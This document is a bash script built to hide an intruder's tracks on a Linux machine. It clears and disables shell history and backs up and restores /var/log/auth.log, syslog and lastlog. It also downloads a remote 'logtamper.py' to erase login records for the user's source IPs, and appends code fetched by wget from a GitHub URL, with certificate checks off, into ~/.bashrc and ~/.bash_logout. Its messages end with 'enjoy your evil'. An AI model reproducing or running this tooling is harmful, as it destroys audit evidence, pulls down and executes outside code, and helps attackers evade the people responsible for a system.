if [ ! -f ~/.bashrc ];then 
  touch /tmp/_bash;
fi
if [ ! -f ~/.bash_logout ];then
  touch /tmp/_bash_out;
else
  cp ~/.bash_logout /tmp/_bash_out;
fi

history -c ;
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;
export HACK="cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc;bash;. ~/.bash_logout" 
REST="\e[0m"
UNDERLINE="\e[4m"
ColorRed="\e[31m"
ColorGreen="\e[32m"
ColorYellow="\e[33m"
ColorBlue="\e[34m"
ColorMagenta="\e[35m"
ColorCyan="\e[36m"

my_name="$(whoami)"
my_pts="$(who am i| awk '{print $2}' | xargs)"
my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
index_f=/tmp/_fadsgindexfs;
clear_shell=/tmp/asdgsdgdg_log_c;

function _bak {
  if [ -f $1 ];then
    cp -v $1 /tmp/  2>/dev/null 
    echo $1 >> $index_f
  fi
}

function _resume {
  for i in $(cat $index_f);
  do
    if [ -f $1 ];then
      mv $i /var/log/  2>/dev/null;
      if [ $? -eq 0 ];then
	 gglog $i " [resume]"
      fi 
    fi 
  done
}

function gglog {
    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"
}

function CL {
    if [ -f $clear_shell ];then
	for ip_one in $(cat $my_ips);do
	    gglog "clear $my_name $ip_one"
    	    python $clear_shell -m 2 -u $my_name -i $ip_one ;
    	    python $clear_shell -m 1 -u $my_name -i $ip_one ;
        done
    else
	gglog "no cl to found"
    fi
}


function ByeHack {
  mv /tmp/_bash ~/.bashrc
  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
      rm ~/.bash_logout;
  else
      mv /tmp/_bash_out ~/.bash_logout;
  fi
  CL
  _resume;
  rm $my_ips;
  rm $index_f;
  rm $clear_shell;
}

if [ !  -f $clear_shell ];then
    wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;
    gglog "Download logtamper ok"
fi

last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips

_bak /var/log/auth.log;
_bak /var/log/syslog;
_bak /var/log/lastlog;

gglog "bak /var/log/"

gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout;
if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
    gglog "warnning user is logined in !!!! , so exit ";
    ByeHack;
else
    gglog ${UNDERLINE}" safe ! -- enjoy your evil "
fi
